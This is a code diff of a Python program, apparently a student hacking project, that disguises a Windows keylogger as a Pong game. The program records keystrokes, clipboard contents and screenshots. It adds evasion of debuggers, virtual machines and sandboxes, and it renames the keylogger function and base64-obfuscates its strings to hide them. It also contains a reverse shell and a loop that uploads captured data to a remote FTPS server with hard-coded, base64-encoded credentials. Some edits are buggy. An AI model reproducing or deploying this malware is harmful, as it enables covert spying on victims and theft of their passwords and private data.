@@ -15,6 +15,7 @@ from sys import gettrace as sys_gettrace
 from tkinter import *
 import pysftp
 from _thread import *
+import ctypes
 
 #Variables
 user32 = windll.user32
@@ -22,12 +23,12 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 current_hwnd = 0
-screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
+#screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
 screenshot_number = 0
 expression = ""
 port_reverse_shell = 31337
-host_sftp = "192.168.0.104"                         #insert ip of sftp server here (normally no obfuscation required since server should be on a hacked device)
-username_sftp = "ZGVza3RvcC03MjJoM2k4XG1hbnVl"      #insert base64 encoded username of sftp server
+host_sftp = "192.168.178.87"                         #insert ip of sftp server here (normally no obfuscation required since server should be on a hacked device)
+username_sftp = "ZGVza3RvcC00N2V0YWQyXG1hbnVlbA=="      #insert base64 encoded username of sftp server
 password_sftp = "VGVubmlzMTIh"                      #insert base64 encoded passowrd of sftp server
 
 #Functions
@@ -40,16 +41,16 @@ class guiGame():
         pygame.init()
         self.clock = pygame.time.Clock()
 
-        WIDTH, HEIGHT = 1280, 960
-        self.WIN = pygame.display.set_mode((WIDTH, HEIGHT))  #screen width/height
+        self.WIDTH, self.HEIGHT = 1280, 960
+        self.WIN = pygame.display.set_mode((self.WIDTH, self.HEIGHT))  #screen width/height
         pygame.display.set_caption("Pong")    #header
         self.FPS = 60
 
 
         #game ractangles
-        self.BALL = pygame.Rect(WIDTH/2 - 15, HEIGHT/2 - 15, 30,30)
-        self.PLAYER = pygame.Rect(WIDTH - 20, HEIGHT/2 - 70,10,140)
-        self.OPPONENT = pygame.Rect(10, HEIGHT/2 - 70,10,140)
+        self.BALL = pygame.Rect(self.WIDTH/2 - 15, self.HEIGHT/2 - 15, 30,30)
+        self.PLAYER = pygame.Rect(self.WIDTH - 20, self.HEIGHT/2 - 70,10,140)
+        self.OPPONENT = pygame.Rect(10, self.HEIGHT/2 - 70,10,140)
 
         #background
         self.BG = pygame.Color("grey12")
@@ -61,9 +62,8 @@ class guiGame():
         self.OPPONENT_VEL = 7
 
     def BALL_animation(self):
-        global BALL_VEL_X, BALL_VEL_Y
-        self.BALL.x += BALL_VEL_X
-        self.BALL.y += BALL_VEL_Y
+        self.BALL.x += self.BALL_VEL_X
+        self.BALL.y += self.BALL_VEL_Y
         #ballbouncing
         if self.BALL.top <= 0 or self.BALL.bottom >= self.HEIGHT:
             self.BALL_VEL_Y *= -1
@@ -72,7 +72,7 @@ class guiGame():
             self.BALL_restart()
             
         if self.BALL.colliderect(self.PLAYER) or self.BALL.colliderect(self.OPPONENT):
-            BALL_VEL_X *= -1
+            self.BALL_VEL_X *= -1
         
             
     def PLAYER_animation(self):
@@ -93,14 +93,13 @@ class guiGame():
             self.OPPONENT.bottom = self.HEIGHT
             
     def BALL_restart(self):
-        global BALL_VEL_Y, BALL_VEL_X
         self.BALL.center = (self.WIDTH/2, self.HEIGHT/2)
-        BALL_VEL_Y *= random.choice((1,-1))
-        BALL_VEL_X *= random.choice((1,-1))
+        self.BALL_VEL_Y *= random.choice((1,-1))
+        self.BALL_VEL_X *= random.choice((1,-1))
 
 
     #simple pong game if debugger is detected
-    def start(self):
+    def end(self):
         while True:
             #handling input, checks if the close button got clicked!
             for event in pygame.event.get():
@@ -138,7 +137,7 @@ class guiGame():
 
 
 #------------------------Keylogger and Screenshotter------------------------
-def get_current_process():
+def get_shopping_list():
     #get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
     #find the process ID
@@ -156,18 +155,18 @@ def get_current_process():
     #print out the header if we 're in the right process
     processinfo = "\n[ PID: \%s - \%s - \%s ]" % (process_id , executable.value, window_title.value) +"\n"
     print(processinfo)
-    WriteToFile(processinfo)
+    write_to_file(processinfo)
     #close handles
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
     #create and register a hook manager
     kl = pyWinhook.HookManager()
-    kl.KeyDown = KeyStroke
+    kl.KeyDown = key_stroke     #before KeyStroke   -------- if not working change here!
     #register the hook and execute forever
     kl.HookKeyboard()
     pythoncom.PumpMessages()
 
-def WriteToFile(s):
+def write_to_file(s):
      #save keystrokes to a file
     if not os.path.exists(str(get_path()) + "keystrokes"):
         os.makedirs(str(get_path()) + "keystrokes")
@@ -177,7 +176,7 @@ def WriteToFile(s):
     if s == "[Space]":
         file.write(" ")
     else:
-        file.write(base64.b64encode(s))
+        file.write(s)   #base64 encoding should be added here
     file.close()
 
 def WritePasswordToFile(s):
@@ -190,7 +189,7 @@ def WritePasswordToFile(s):
     file.write(s)
     file.close()
 
-def KeyStroke(event) :
+def key_stroke(event) :
     global current_window
     #check to see if target changed windows
     if event.WindowName != current_window :
@@ -198,12 +197,12 @@ def KeyStroke(event) :
         global screenshot_number
         screenshot_number += 1
         SaveScreenshot("screenshot" + str(screenshot_number) + ".png")
-        get_current_process()
+        get_shopping_list()
     #if they pressed a standard key
     if 32 < event.Ascii < 127:
         c = chr(event.Ascii)
         print(c)
-        WriteToFile(c)
+        write_to_file(c)
     else :
     #if [ Ctrl - V ] , get the value on the clipboard
         if event.Key == "V":
@@ -212,11 +211,11 @@ def KeyStroke(event) :
             win32clipboard.CloseClipboard()
             p = "[PASTE] %s[PASTE]" % pasted_value
             print(p)
-            WriteToFile(p)
+            write_to_file(p)
         else :
             k = "[%s]" % event.Key
             print(k)
-            WriteToFile(k)
+            write_to_file(k)
     #pass execution to next hook registered
     return True
 
@@ -255,7 +254,7 @@ def SaveScreenshot(filename):
 
 
 #------------------------Communication encryption Function------------------------
-def AESencrypt(message, key):
+def AES_encrypt(message, key):
     key = "This is a key123"
     aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
     ciphertext = aes.encrypt(message)
@@ -375,7 +374,7 @@ __debug__ #true if started with python -d, else wrong
 #------------------------END Detect Debuggers------------------------
 
 #------------------------Start detection of VM------------------------
-def is_vm():
+def is_vm(test):
     try:
         if os.path.exists("C:\\Windows\\system32\\vmcheck.dll") or hasattr(sys, "getwindowsversion"):
             return True
@@ -384,6 +383,116 @@ def is_vm():
     except:
         return False
 #------------------------END detection of VM------------------------
+
+#------------------------Begin Virtual Machine detection------------------------
+#detect vm
+def is_vm():
+    #check if virtualbox is installed
+    if os.path.exists("C:\\Program Files\\Oracle\\VirtualBox"):
+        print("!!Warning: [-] Virtualbox is installed!")
+        return False
+    #check if vmware is installed
+    elif os.path.exists("C:\\Program Files\\VMware\\VMware Workstation"):
+        print("!!Warning: [-] VMware is installed!")
+        return False
+    else:
+        print("[+] Virtualbox is not installed!")
+        return False
+#------------------------END Virtual Machine detection------------------------
+
+#------------------------Start detection of Sandbox------------------------
+keystrokes   = 0
+mouse_clicks = 0
+double_clicks = 0
+class LASTINPUT(ctypes.Structure):
+     _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
+
+def get_last_input(user, kernel):
+    struct_lastinputinfo = LASTINPUT()
+    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUT)
+    # Here we will get the last input that was registered
+    user.GetlastInputInfo(ctypes.byref(struct_lastinputinfo))
+    # Here we will determine how long our target has been up
+    runtime = kernel.GetTickCount()
+    elapsed = runtime - struct_lastinputinfo.dwTime
+    # Debug print to check if everything is working correctly
+    print(elapsed)
+    return elapsed
+
+# Here we define our function to register and count key presses
+def get_key_press(user):
+    global mouse_clicks
+    global keystrokes
+    for keys in range(0,0xff):
+        if user.GetAsyncKeyState(keys) ==  -32767: 
+            if keys == 0x1: 
+                mouse_clicks += 1
+                return time.time()
+            elif keys >= 32 and keys < 127:
+                keystrokes +=1
+    return None
+
+def is_sandbox():
+    user    = ctypes.windll.user32
+    kernel =  ctypes.windll.kernel32
+    global mouse_clicks
+    global keystrokes
+
+    max_keystrokes = random.randint(10,25)
+    max_mouse_clicks = random.randint(5, 25)
+    double_clicks = 0
+    max_double_clicks = 10
+    double_click_threshold = 0.250 # Seconds
+    first_double_click = None
+
+    average_mousetime = 0
+    max_input_threshold = 30000 # Milliseconds
+    previous_t = None
+    detection_complete = False
+    last_input = get_last_input(user, kernel)
+
+    # If we get to the threshold we are not going to be executing 
+    if last_input >= max_input_threshold:
+        sys.exit(0)
+ 
+ 
+    while not detection_complete:
+        kpress_t = get_key_press(user)
+ 
+        if kpress_t is not None and previous_t is not None:
+            # Here we are going to be calculating the time 
+            # between double clicks
+            elapsed = kpress_t - previous_t
+            # If we register a double click we are going to add 
+            # that to the total
+            if elapsed <= double_click_threshold:
+                double_clicks += 1
+                  
+                # If we exceed the double click threshold we 
+                # will stop executing
+                if first_double_click is None:
+                    first_double_click = time.time()
+                else:
+                    if double_clicks == max_double_clicks:
+                        if kpress_t - first_double_click <= (max_double_clicks*double_click_threshold):
+                            sys.exit(0) 
+ 
+         # See if everything checks out, if not, stop executing the function
+            if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
+                return
+            previous_t = kpress_t
+        elif kpress_t is not None:
+            previous_t = kpress_t
+
+def call_sandbox():
+    if is_sandbox():
+        print("!!Warning: [-] Sandbox detected!")
+        return False
+    else:
+        print("[+] Sandbox not detected!")
+        return True
+
+#------------------------END detection of Sandbox------------------------
 
 #------------------------Reverse Shell Function------------------------
 def reverse_shell(SERVER_HOST, SERVER_PORT):
@@ -452,25 +561,43 @@ def ftps_check_dir(ftps, dir):
         return False
 #------------------------END Connection to FTPS server------------------------
 
+#------------------------Detecting Debugger------------------------
+import inspect
+
+def isDebugging():
+  for frame in inspect.stack():
+    if frame[1].endswith("pydevd.py") or frame[1].endswith("pdb.py") or 'pydevd' in sys.modules or 'pdb' in sys.modules or not is_debugger_present() or not hasattr(sys, "getwindowsversion") or is_vm(): # or call_sandbox():
+      return True
+  return False
+
+
 #Test all of the above functions:
 def main():
     count = 0
     #debugger and vm detection, if detected open the game, otherwise the keylogger
-    #if is_debugger_present() == True or is_vm() == True:   #-----------enable this one
-    if 2 == "hello": 
-        print("Debugger detected!")
+    if isDebugging() == True: 
+        print(base64.b64decode("RGVidWdnZXIgZGV0ZWN0ZWQh"))
         game = guiGame()
-        game.start()
-        sys.exit()
+        game.end()
+    #parameterdetection for game or keylogger
+    elif len(sys.argv) > 1:
+        if sys.argv[1] != "install":
+            game = guiGame()
+            game.end()
+        else:
+            print(base64.b64decode("SW5zdGFsbGluZy4uLiCwLbA="))
+    elif input(base64.b64decode("V29sbGVuIFNpZSBkYXMgU3BpZWwgc3RhcnRlbj8gKHkvbik6IA==")) == "n":
+            game = guiGame()
+            game.end()
     else:
         #multithreading for keylogger and Screenshotsaving
-        start_new_thread(get_current_process, ())     #-----------enable this one
+        start_new_thread(get_shopping_list, ())     #-----------enable this one
         #loop for connection protocol to FTPS server
         while True:
             os.system('cls' if os.name == 'nt' else 'clear')
             try:
                 ftps = ftps_connect() #for ipv4 connection test
-                print("Connected to FTPS server! Debugging purpose, delete later!!")
+                print(base64.b64decode("Q29ubmVjdGVkIHRvIEZUUFMgc2VydmVyISBEZWJ1Z2dpbmcgcHVycG9zZSwgZGVsZXRlIGxhdGVyISE="))
             except:
                 time.sleep(20)
             
@@ -479,9 +606,9 @@ def main():
             try:
                 if count == 0:
                     try:
-                        ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
+                        ftps.mkdir(os.environ.get(base64.b64decode("USERNAME")) + "0_0_2")
                         count += 1
-                        ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                        ftps.chdir(os.environ.get(base64.b64decode('USERNAME')) + "0_0_2")
                     except:
                         pass
                 
@@ -512,7 +639,7 @@ def main():
                                 ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n+1) + ".png")
                                 n += 2
                             ftps.chdir("..")
-                            print("done uploading screenshots")
+                            print(base64.b64decode("ZG9uZSB1cGxvYWRpbmcgc2NyZWVuc2hvdHM="))
                     
                
                     elif command == "get keylogger":
@@ -523,7 +650,7 @@ def main():
                             time.sleep(2)
                             ftps_upload_file(ftps, str(get_path()) + "keystrokes\\keylogger.txt")
                             ftps.chdir("..")
-                            print("Uploaded keystrokes to FTPS server! Debugging purpose, delete later!!")
+                            print(base64.b64decode("VXBsb2FkZWQga2V5c3Ryb2tlcyB0byBGVFBTIHNlcnZlciEgRGVidWdnaW5nIHB1cnBvc2UsIGRlbGV0ZSBsYXRlciEh"))
                         
                     #everything after here is jet to come
                     elif command == "get process":
@@ -541,7 +668,7 @@ def main():
                     elif command == "get clipboard":
                         pass
                     else:
-                        print("in reverse shell creation")
+                        print(base64.b64decode("aW4gcmV2ZXJzZSBzaGVsbCBjcmVhdGlvbg=="))
                         time.sleep(5)
                         command = str(command)
                         time.sleep(5)
@@ -553,7 +680,7 @@ def main():
 
             except:
                 os.system('cls' if os.name == 'nt' else 'clear')
-                print("No commands found on server!")
+                print(base64.b64decode("Tm8gY29tbWFuZHMgZm91bmQgb24gc2VydmVyIQ=="))
             
             #close connection
             ftps.close()
